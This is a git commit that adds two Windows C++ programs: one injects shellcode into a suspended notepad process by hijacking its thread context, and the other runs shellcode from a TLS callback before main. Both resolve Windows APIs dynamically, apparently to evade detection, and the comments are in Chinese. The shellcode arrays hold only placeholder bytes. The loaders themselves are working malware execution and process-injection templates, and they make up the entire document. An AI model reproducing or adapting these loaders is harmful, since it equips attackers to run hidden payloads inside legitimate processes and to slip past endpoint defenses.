78a17bed149c267307fc90b068f884ec4713209e
Lin <candyb0x@163.com>
2025-07-04 18:31:42 +0800

    init

---
+++ SetContextHijackThread/SetContextHijackThread.cpp
@@ -0,0 +1,44 @@
+﻿#include <Windows.h>
+#include <stdio.h>
+#include "safeApi.h"
+
+char shellcode[] = { 0x12 };
+
+// 动态获取API函数指针
+    typedef BOOL (WINAPI *CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+    typedef DWORD (WINAPI *SuspendThread_t)(HANDLE);
+    typedef LPVOID (WINAPI *VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+    typedef BOOL (WINAPI *WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+    typedef BOOL (WINAPI *GetThreadContext_t)(HANDLE, LPCONTEXT);
+    typedef BOOL (WINAPI *SetThreadContext_t)(HANDLE, const CONTEXT*);
+    typedef DWORD (WINAPI *ResumeThread_t)(HANDLE);
+
+int main() {
+    CreateProcessW_t pCreateProcessW = (CreateProcessW_t)SafeGetProcAddress(L"kernel32.dll", "CreateProcessW");
+    SuspendThread_t pSuspendThread = (SuspendThread_t)SafeGetProcAddress(L"kernel32.dll", "SuspendThread");
+    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
+    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
+    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)SafeGetProcAddress(L"kernel32.dll", "GetThreadContext");
+    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)SafeGetProcAddress(L"kernel32.dll", "SetThreadContext");
+    ResumeThread_t pResumeThread = (ResumeThread_t)SafeGetProcAddress(L"kernel32.dll", "ResumeThread");
+
+    STARTUPINFOW siw = { 0 };
+    siw.cb = sizeof(siw);
+    PROCESS_INFORMATION pi = { 0 };
+    pCreateProcessW(NULL, L"notepad", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siw, &pi);
+    // 由于已挂起创建，无需再次SuspendThread
+    LPVOID lpBuffer = pVirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    pWriteProcessMemory(pi.hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL);
+
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_ALL;
+    pGetThreadContext(pi.hThread, &ctx);
+#ifdef _WIN64
+    ctx.Rip = (DWORD64)lpBuffer;
+#else
+    ctx.Eip = (DWORD)lpBuffer;
+#endif
+    pSetThreadContext(pi.hThread, &ctx);
+    pResumeThread(pi.hThread);
+    return 0;
+}
---
+++ TLSCodeExecute/TLSCodeExecute.cpp
@@ -0,0 +1,31 @@
+﻿#include <Windows.h>
+#include <stdio.h>
+#pragma comment(linker, "/section:.data,RWE") 
+#include "safeApi.h"
+
+unsigned char shellcode[] = { 0x12 };  //shellcode
+
+VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
+//DllHandle模块句柄、Reason调用原因、 Reserved加载方式（显式/隐式）
+{
+    if (dwReason == DLL_PROCESS_ATTACH)
+    {
+        // 只是一种执行手段，依然可以配合其他手段组合。
+        ((void(WINAPI*)(void)) & shellcode)();
+    }
+}
+//使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用
+#pragma comment (linker, "/INCLUDE:__tls_used")
+#pragma comment (linker, "/INCLUDE:__tls_callback")
+
+#pragma data_seg (".CRT$XLB")
+//.CRT表明是使用C RunTime机制，$后面的XLB中：X表示随机的标识
+//L表示是TLS callback section，B可以被换成B到Y之间的任意一个字母，
+//但是不能使用“.CRT$XLA”和“.CRT$XLZ”，因为“.CRT$XLA”和“.CRT$XLZ”是用于tlssup.obj的。
+EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;
+#pragma data_seg ()
+
+int main()
+{
+    return 0;
+}
